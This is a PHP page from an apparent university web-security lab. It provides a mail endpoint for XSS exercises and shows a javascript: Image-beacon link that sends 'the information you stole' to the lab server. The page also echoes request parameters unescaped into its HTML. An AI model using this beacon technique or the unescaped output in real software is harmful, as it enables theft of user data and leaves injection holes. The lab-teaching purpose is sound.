<?php
  $from = "zoobar@dasak.csc.kth.se";
  $to = $_GET['to'] ? $_GET['to'] : "";
  $payload = $_GET['payload'] ? $_GET['payload'] : "";
?>
<!DOCTYPE html> 

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">

  <link rel="stylesheet" type="text/css" href="labs.css" />
  <title>Lab W - Email Script</title>
</head>

<body>
  <h1>Lab W - Email Script</h1>
  <p>You can use this server side script to send automated emails from client-side JavaScript. For example, clicking this client-side hyperlink will cause an email to be sent by our web server (dasak.csc.kth.se).
  </p>
    <pre class="tty"><?php 
    $link = "javascript:void((new" .
            " Image()).src=" . 
            "'http://dasak.csc.kth.se/labw/sendmail.php?'" . 
            " + 'to=$to'" .
            " + '&amp;payload=$payload' + '&amp;random='" . 
            " + Math.random());";
    echo "<a href=\"$link\">$link</a>";
    ?></pre>
    <p>The random argument is ignored, but ensures that the browser 
bypasses its cache when downloading the image. We suggest that you use 
the random argument in your scripts as well. Newlines are not allowed 
in <span style="font-family: monospace;">javascript:</span> links; if this bothers you, try 

<a href="http://scriptasylum.com/tutorials/encode-decode.html">URL encoding</a>.
The <code>void(...);</code> construct prevents the browser from 
navigating to a new page consisting of the contents
of the expression (which is what it normally does when it encounters a 
non-void expression like <code><a href="javascript:2+2">javascript:2+2</a></code>). </p>
<h2>Test form</h2>
<p>If you just want to try out the script, you can use this form.
      (For the programming project, you'll probably
want to use the JavaScript image technique shown above.)</p>
<form method="get">
<div>
<b>To:</b> 
<input name="to" size="40" placeholder="youremailt@kth.se" /><i>(@kth.se e-mail address)
</div>
<div>
</div>
<div>
<b>Payload:</b>
<input name="payload" placeholder="abcdefg" size="40" />
<i>(the information you stole)</i>
</div>
<div>
<input type="submit" value="Send Email" name="send_submit" />

<?php
  if($_REQUEST['to']) {
    if(!preg_match("/^[a-z0-9_\-\+]+@kth.se$/i", $_REQUEST['to'])) {
      echo "Please use an @kth.se e-mail address";
    } else {
      $to = $_REQUEST['to'];
      $subject = "Message from " . $_REQUEST['to'];
      $message = "Payload:\n\n$payload";
      $headers = "From: " . $from; 
      mail($to, $subject, $message, $headers, "-f " . $from);
      echo "<em>Sent!</em>";
    }
  }
?>
</div>
<h2>Source code</h2>
<p>In case you are curious, here is the source code of this page.</p>
<pre><?php echo htmlspecialchars(file_get_contents(__FILE__)); ?></pre>
</form>
</div>
</div>
</div>
</body>
</html>